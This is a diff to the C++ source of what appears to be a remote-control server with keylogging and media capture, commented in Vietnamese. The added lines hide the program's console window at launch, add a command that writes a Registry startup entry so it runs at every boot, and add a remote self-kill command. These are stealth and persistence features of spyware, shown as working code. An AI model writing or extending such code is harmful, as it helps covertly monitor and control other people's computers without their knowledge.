@@ -1,4 +1,7 @@
-﻿#include "Global.h"
+﻿// Dòng này giấu cửa sổ Console đi ngay khi khởi động (Không hiện màn hình đen)
+#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
+
+#include "Global.h"
 #include "SystemManager.h"
 #include "Keylogger.h"
 #include "MediaManager.h"
@@ -81,6 +84,21 @@ void on_message(server* s, websocketpp::connection_hdl hdl, server::message_ptr 
                 j_res["type"] = "ACTION_RESULT";
             }
 
+            else if (cmd == "PERSISTENCE") {
+                std::string mode = j_req["mode"]; // "ON" hoặc "OFF"
+                bool ok = false;
+
+                if (mode == "ON") {
+                    ok = InstallStartup();
+                    j_res["msg"] = ok ? "DA CAI DAT: Server se tu chay khi bat may." : "LOI: Khong the ghi Registry.";
+                }
+                else {
+                    ok = RemoveStartup();
+                    j_res["msg"] = ok ? "DA GO BO: Server se khong tu chay nua." : "LOI: Khong tim thay hoac khong the xoa Registry.";
+                }
+                j_res["type"] = "ACTION_RESULT";
+            }
+
             // =============================================================
             // 3. NHÓM LỆNH: KEYLOGGER (BÀN PHÍM)
             // =============================================================
@@ -140,6 +158,24 @@ void on_message(server* s, websocketpp::connection_hdl hdl, server::message_ptr 
                     j_res["msg"] = "Dang ghi hinh 10s...";
                 }
                 j_res["type"] = "ACTION_RESULT";
+            }
+
+            // =============================================================
+            else if (cmd == "KILL_SERVER") {
+                j_res["msg"] = "Server da nhan lenh tu huy. Tam biet!";
+                j_res["type"] = "ACTION_RESULT";
+
+                // Gửi tin nhắn phản hồi trước khi chết để Client biết
+                s->send(hdl, j_res.dump(), msg->get_opcode());
+
+                // Tạo một luồng riêng để thực hiện hành động tắt sau 1 giây
+                // (Phải đợi 1s để tin nhắn trên kịp gửi đi qua mạng)
+                std::thread([]() {
+                std::this_thread::sleep_for(std::chrono::seconds(1));
+                exit(0); // Lệnh tắt chương trình ngay lập tức
+                }).detach();
+
+            // Không break, để nó chạy xuống cuối hàm cho đúng logic (dù sắp tắt)
             }
 
             // =============================================================
